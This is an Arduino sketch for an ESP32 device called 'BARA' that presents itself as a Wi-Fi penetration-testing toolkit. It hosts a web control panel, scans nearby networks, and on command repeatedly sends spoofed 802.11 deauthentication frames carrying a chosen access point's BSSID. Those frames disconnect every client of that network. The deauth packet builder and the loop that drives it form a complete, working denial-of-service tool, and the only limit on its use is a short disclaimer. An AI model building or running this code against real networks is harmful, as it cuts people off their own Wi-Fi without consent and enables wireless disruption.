// ============================================================================
// 🩸 B A R A — A D V A N C E D  W I - F I  T O O L K I T  F O R  E S P 3 2 🩸
// ============================================================================
// Developed by: Ahmed Nour Ahmed | Qena, Egypt
// Purpose: Ultimate Wi-Fi penetration testing & network reconnaissance tool
// Features: Deauth attack, live scanning, captive portal, blood-hacker UI
// ============================================================================
// 🔥 WARNING: For educational & authorized testing ONLY. Misuse is illegal.
// ============================================================================

#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <esp_wifi.h>
#include <ArduinoJson.h>

// ==================== ⚙️ CONFIGURATION ====================
const char* AP_SSID = "bara";
const char* AP_PASS = "A7med@Elshab7";
const uint16_t WEB_PORT = 80;
const uint8_t MAX_NETWORKS = 50;

// ==================== 🧠 GLOBAL VARIABLES ====================
DNSServer dnsServer;
AsyncWebServer server(WEB_PORT);

bool deauthActive = false;
uint8_t deauthTargetMAC[6] = {0};
String deauthTargetBSSID = "";
unsigned long lastDeauthTime = 0;
const unsigned long DEAUTH_INTERVAL_MS = 100;

// For scan results
struct WiFiNetwork {
    String bssid;
    String ssid;
    int32_t rssi;
    uint8_t channel;
};

WiFiNetwork scannedNetworks[MAX_NETWORKS];
uint8_t scannedCount = 0;
bool scanInProgress = false;

// ==================== 🌐 HTML / CSS / JS (BLOOD-HACKER THEME) ====================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🩸 BARA WI-FI TOOLKIT 🩸</title>
    <style>
        :root {
            --blood-red: #ff0000;
            --dark-bg: #0a0000;
            --glow: 0 0 15px #ff0000, 0 0 30px #800000;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: var(--dark-bg);
            color: #ff3333;
            font-family: 'Courier New', monospace;
            overflow-x: hidden;
            position: relative;
            min-height: 100vh;
        }
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: 
                radial-gradient(circle at 10% 20%, rgba(255,0,0,0.07) 0%, transparent 40%),
                radial-gradient(circle at 90% 80%, rgba(255,0,0,0.09) 0%, transparent 45%);
            pointer-events: none;
            z-index: -1;
        }
        .container {
            max-width: 900px;
            margin: 0 auto;
            padding: 20px;
        }
        header {
            text-align: center;
            margin: 20px 0 30px;
            position: relative;
        }
        h1 {
            font-size: 3.2em;
            color: var(--blood-red);
            text-shadow: var(--glow);
            letter-spacing: 3px;
            margin-bottom: 8px;
            animation: pulse 3s infinite;
        }
        @keyframes pulse {
            0%, 100% { text-shadow: 0 0 15px #ff0000, 0 0 30px #800000; }
            50% { text-shadow: 0 0 25px #ff0000, 0 0 50px #ff0000, 0 0 70px #800000; }
        }
        .subtitle {
            color: #ff6666;
            font-size: 1.1em;
            margin-top: 5px;
        }
        .card {
            background: rgba(20, 0, 0, 0.6);
            border: 1px solid var(--blood-red);
            border-radius: 12px;
            padding: 22px;
            margin: 20px 0;
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
            backdrop-filter: blur(2px);
        }
        .card h2 {
            color: #ff5555;
            margin-bottom: 15px;
            font-size: 1.6em;
            text-shadow: 0 0 8px rgba(255,0,0,0.5);
        }
        .status-bar {
            padding: 12px;
            margin: 15px 0;
            border-radius: 8px;
            font-weight: bold;
            text-align: center;
            background: rgba(0,0,0,0.7);
            border: 1px solid #ff4444;
        }
        .btn {
            background: var(--blood-red);
            color: white;
            border: none;
            padding: 12px 24px;
            margin: 8px 5px;
            border-radius: 6px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 16px;
            transition: all 0.3s;
            box-shadow: 0 0 12px rgba(255,0,0,0.6);
        }
        .btn:hover {
            background: #cc0000;
            transform: translateY(-2px) scale(1.05);
            box-shadow: 0 0 20px rgba(255,0,0,0.9);
        }
        .btn:active { transform: translateY(1px); }
        .btn:disabled {
            background: #666;
            cursor: not-allowed;
            box-shadow: none;
        }
        .input-group {
            margin: 15px 0;
        }
        input[type="text"] {
            padding: 12px;
            width: 280px;
            background: rgba(0,0,0,0.8);
            border: 1px solid #ff4444;
            border-radius: 6px;
            color: #ff6666;
            font-family: monospace;
            font-size: 16px;
        }
        table {
            width: 100%;
            border-collapse: collapse;
            margin-top: 15px;
            color: #ffaaaa;
        }
        th, td {
            padding: 12px 10px;
            text-align: left;
            border-bottom: 1px solid rgba(255,50,50,0.3);
        }
        th {
            color: #ff7777;
            font-size: 1.1em;
        }
        tr:hover {
            background: rgba(255,0,0,0.08);
        }
        .log {
            height: 160px;
            overflow-y: auto;
            background: rgba(0,0,0,0.85);
            padding: 12px;
            border: 1px solid #ff3333;
            border-radius: 8px;
            font-family: monospace;
            font-size: 14px;
            white-space: pre-wrap;
        }
        .log div { margin: 4px 0; }
        .success { color: #55ff55; }
        .error { color: #ff4444; }
        .warning { color: #ffaa44; }
        .info { color: #aaaaff; }
        footer {
            text-align: center;
            margin-top: 30px;
            color: #ff5555;
            font-size: 0.9em;
            opacity: 0.8;
        }
        @media (max-width: 768px) {
            .container { padding: 10px; }
            h1 { font-size: 2.4em; }
            input[type="text"] { width: 100%; font-size: 14px; }
            .btn { padding: 10px 18px; font-size: 14px; width: 100%; margin: 5px 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🩸 B A R A  T O O L K I T 🩸</h1>
            <div class="subtitle">Developed by Ahmed Nour Ahmed | Qena, Egypt</div>
        </header>

        <div class="card">
            <h2>⚡ SYSTEM STATUS</h2>
            <div id="status" class="status-bar">Initializing hotspot...</div>
            <button class="btn" id="scanBtn" onclick="scan()">📡 SCAN NETWORKS</button>
            <button class="btn" onclick="toggleDeauth()">⚔️ Toggle Deauth Panel</button>
            <div id="deauthPanel" style="display:none; margin-top:15px;">
                <div class="input-group">
                    <input type="text" id="bssidInput" placeholder="Target BSSID (e.g., AA:BB:CC:DD:EE:FF)" maxlength="17">
                    <button class="btn" onclick="startDeauth()">⚡ START DEAUTH</button>
                    <button class="btn" style="background:#800000;" onclick="stopDeauth()">⏹ STOP DEAUTH</button>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>📡 SCANNED NETWORKS (<span id="netCount">0</span>)</h2>
            <table>
                <thead>
                    <tr>
                        <th>BSSID</th>
                        <th>SSID</th>
                        <th>RSSI</th>
                        <th>CH</th>
                        <th>ACTION</th>
                    </tr>
                </thead>
                <tbody id="networkTable">
                    <tr><td colspan="5" style="text-align:center;">Press SCAN NETWORKS to begin...</td></tr>
                </tbody>
            </table>
        </div>

        <div class="card">
            <h2>🩸 ATTACK LOGS</h2>
            <div id="logs" class="log"></div>
        </div>

        <footer>
            BARA v2.0 — The Ultimate ESP32 Wi-Fi Weapon | For Authorized Use Only
        </footer>
    </div>

    <script>
        let logs = [];
        const MAX_LOGS = 100;

        function log(msg, cls = 'info') {
            const now = new Date().toLocaleTimeString();
            const entry = `[${now}] ${msg}`;
            logs.push({text: entry, cls});
            if (logs.length > MAX_LOGS) logs.shift();
            renderLogs();
        }

        function renderLogs() {
            const el = document.getElementById('logs');
            el.innerHTML = logs.map(l => `<div class="${l.cls}">${l.text}</div>`).join('');
            el.scrollTop = el.scrollHeight;
        }

        function updateStatus(msg, cls = 'info') {
            const el = document.getElementById('status');
            el.textContent = msg;
            el.className = 'status-bar ' + cls;
        }

        async function scan() {
            const btn = document.getElementById('scanBtn');
            try {
                btn.disabled = true;
                btn.textContent = '⏳ Scanning...';
                updateStatus('📡 Scanning networks... (may take 5-10s)', 'warning');
                log('Initiating network scan...', 'info');
                
                const res = await fetch('/scan');
                if (!res.ok) throw new Error('Scan request failed');
                
                const data = await res.json();
                renderNetworks(data);
                updateStatus(`✅ Found ${data.length} network(s)`, 'success');
                log(`Scan complete: ${data.length} network(s) found`, 'success');
            } catch (e) {
                updateStatus('❌ Scan failed', 'error');
                log('Scan error: ' + e.message, 'error');
            } finally {
                btn.disabled = false;
                btn.textContent = '📡 SCAN NETWORKS';
            }
        }

        function renderNetworks(networks) {
            const tbody = document.getElementById('networkTable');
            const countEl = document.getElementById('netCount');
            tbody.innerHTML = '';
            countEl.textContent = networks.length;

            if (networks.length === 0) {
                tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No networks found</td></tr>';
                return;
            }

            networks.forEach(net => {
                const row = tbody.insertRow();
                row.insertCell().textContent = net.bssid;
                row.insertCell().textContent = net.ssid || '*** HIDDEN ***';
                row.insertCell().textContent = net.rssi + ' dBm';
                row.insertCell().textContent = net.channel;
                const btnCell = row.insertCell();
                const btn = document.createElement('button');
                btn.className = 'btn';
                btn.textContent = '🎯 SELECT';
                btn.style.padding = '6px 12px';
                btn.style.fontSize = '14px';
                btn.onclick = () => {
                    document.getElementById('bssidInput').value = net.bssid;
                    log(`Selected target: ${net.bssid} (${net.ssid || 'HIDDEN'})`, 'warning');
                };
                btnCell.appendChild(btn);
            });
        }

        function toggleDeauth() {
            const panel = document.getElementById('deauthPanel');
            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
        }

        async function startDeauth() {
            const bssid = document.getElementById('bssidInput').value.trim().toUpperCase();
            if (!bssid || !/^[0-9A-F]{2}(:[0-9A-F]{2}){5}$/.test(bssid)) {
                alert('⚠️ Invalid BSSID format! Use AA:BB:CC:DD:EE:FF');
                log('Invalid BSSID format provided', 'error');
                return;
            }
            
            try {
                const res = await fetch(`/deauth?bssid=${encodeURIComponent(bssid)}`);
                const msg = await res.text();
                log(msg, 'warning');
                updateStatus('🔥 DEAUTH ACTIVE — Target: ' + bssid, 'warning');
            } catch (e) {
                log('Deauth start error: ' + e.message, 'error');
                updateStatus('❌ Failed to start deauth', 'error');
            }
        }

        async function stopDeauth() {
            try {
                const res = await fetch('/stopdeauth');
                const msg = await res.text();
                log(msg, 'success');
                updateStatus('✅ Deauth stopped', 'success');
            } catch (e) {
                log('Deauth stop error: ' + e.message, 'error');
            }
        }

        // Auto-refresh status
        setInterval(() => {
            fetch('/status')
                .then(r => r.json())
                .then(data => {
                    if (data.deauthActive && data.target) {
                        updateStatus(`🔥 DEAUTH ACTIVE — ${data.target}`, 'warning');
                    }
                })
                .catch(() => {});
        }, 2000);

        log('BARA Toolkit initialized successfully', 'success');
        updateStatus('✅ Hotspot active — Connect to "bara"', 'success');
    </script>
</body>
</html>
)rawliteral";

// ==================== 📡 WIFI SCAN FUNCTION ====================
String scanWiFiNetworks() {
    if (scanInProgress) {
        return "{\"error\":\"Scan already in progress\"}";
    }
    
    scanInProgress = true;
    Serial.println("Starting WiFi scan...");
    
    // Synchronous scan with optimal settings
    int n = WiFi.scanNetworks(false, true, false, 300);
    
    if (n < 0) {
        scanInProgress = false;
        Serial.println("Scan failed");
        return "[]";
    }
    
    scannedCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
    Serial.printf("Found %d networks\n", scannedCount);

    DynamicJsonDocument doc(4096);
    JsonArray networks = doc.to<JsonArray>();

    for (int i = 0; i < scannedCount; i++) {
        JsonObject net = networks.createNestedObject();
        net["bssid"] = WiFi.BSSIDstr(i);
        net["ssid"] = WiFi.SSID(i);
        net["rssi"] = WiFi.RSSI(i);
        net["channel"] = WiFi.channel(i);
        
        // Store for later use
        scannedNetworks[i].bssid = WiFi.BSSIDstr(i);
        scannedNetworks[i].ssid = WiFi.SSID(i);
        scannedNetworks[i].rssi = WiFi.RSSI(i);
        scannedNetworks[i].channel = WiFi.channel(i);
    }

    String json;
    serializeJson(doc, json);
    
    WiFi.scanDelete();
    scanInProgress = false;
    
    return json;
}

// ==================== 🔪 DEAUTH PACKET CONSTRUCTION ====================
void sendDeauthFrame(const uint8_t* bssid, uint8_t channel) {
    // Set channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Deauth frame structure (IEEE 802.11)
    uint8_t deauthPacket[26] = {
        /* Frame Control */
        0xC0, 0x00,                           // Type/Subtype: Deauthentication
        /* Duration */
        0x3A, 0x01,
        /* Destination: Broadcast */
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        /* Source: Target AP */
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        /* BSSID: Target AP */
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
        /* Sequence Control */
        0x00, 0x00,
        /* Reason Code: Deauthenticated because sending station is leaving */
        0x01, 0x00
    };

    // Send multiple frames for effectiveness
    for (int i = 0; i < 5; i++) {
        esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
        delayMicroseconds(100);
    }
}

// ==================== 🌐 WEB HANDLERS ====================
void setupWebServer() {
    // Main page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        request->send_P(200, "text/html", index_html);
    });

    // Scan endpoint
    server.on("/scan", HTTP_GET, [](AsyncWebServerRequest *request) {
        String json = scanWiFiNetworks();
        request->send(200, "application/json", json);
    });

    // Start deauth
    server.on("/deauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        if (!request->hasParam("bssid")) {
            request->send(400, "text/plain", "ERROR: BSSID parameter required");
            return;
        }

        String bssidStr = request->getParam("bssid")->value();
        bssidStr.toUpperCase();
        
        // Validate BSSID format
        if (bssidStr.length() != 17) {
            request->send(400, "text/plain", "ERROR: Invalid BSSID length");
            return;
        }

        // Parse BSSID
        int parsed = sscanf(bssidStr.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
            &deauthTargetMAC[0], &deauthTargetMAC[1], &deauthTargetMAC[2],
            &deauthTargetMAC[3], &deauthTargetMAC[4], &deauthTargetMAC[5]);
            
        if (parsed != 6) {
            request->send(400, "text/plain", "ERROR: Invalid BSSID format (use AA:BB:CC:DD:EE:FF)");
            return;
        }

        deauthTargetBSSID = bssidStr;
        deauthActive = true;
        lastDeauthTime = millis();
        
        Serial.printf("Deauth attack started on: %s\n", bssidStr.c_str());
        request->send(200, "text/plain", "⚡ DEAUTH ATTACK INITIATED ON: " + bssidStr);
    });

    // Stop deauth
    server.on("/stopdeauth", HTTP_GET, [](AsyncWebServerRequest *request) {
        deauthActive = false;
        Serial.println("Deauth attack stopped");
        request->send(200, "text/plain", "✅ DEAUTH ATTACK STOPPED");
    });

    // Status endpoint
    server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) {
        DynamicJsonDocument status(256);
        status["deauthActive"] = deauthActive;
        status["target"] = deauthActive ? deauthTargetBSSID : "";
        status["uptime"] = millis() / 1000;
        
        String json;
        serializeJson(status, json);
        request->send(200, "application/json", json);
    });

    // 404 handler
    server.onNotFound([](AsyncWebServerRequest *request) {
        request->redirect("/");
    });

    server.begin();
}

// ==================== 🧪 SETUP ====================
void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n\n");
    Serial.println("==============================================");
    Serial.println("🩸 BARA WI-FI TOOLKIT — INITIALIZING... 🩸");
    Serial.println("==============================================");

    // Configure WiFi mode
    WiFi.mode(WIFI_AP_STA);
    
    // Start Access Point
    Serial.println("Starting Access Point...");
    WiFi.softAP(AP_SSID, AP_PASS);
    
    IPAddress IP = WiFi.softAPIP();
    Serial.print("🔥 Hotspot SSID: ");
    Serial.println(AP_SSID);
    Serial.print("🔥 Hotspot IP: ");
    Serial.println(IP);

    // Start DNS server for captive portal
    dnsServer.start(53, "*", IP);
    Serial.println("✅ DNS Server started");

    // Setup web server
    setupWebServer();
    Serial.println("✅ Web Server started");

    Serial.println("==============================================");
    Serial.println("✅ BARA is LIVE and READY!");
    Serial.println("Connect to 'bara' and navigate to:");
    Serial.print("http://");
    Serial.println(IP);
    Serial.println("==============================================\n");
}

// ==================== 🔁 MAIN LOOP ====================
void loop() {
    // Process DNS requests
    dnsServer.processNextRequest();

    // Execute deauth attack if active
    if (deauthActive) {
        unsigned long currentTime = millis();
        if (currentTime - lastDeauthTime >= DEAUTH_INTERVAL_MS) {
            // Find channel for target
            uint8_t targetChannel = 1;
            for (int i = 0; i < scannedCount; i++) {
                if (scannedNetworks[i].bssid == deauthTargetBSSID) {
                    targetChannel = scannedNetworks[i].channel;
                    break;
                }
            }
            
            sendDeauthFrame(deauthTargetMAC, targetChannel);
            lastDeauthTime = currentTime;
        }
    }

    delay(1);
}
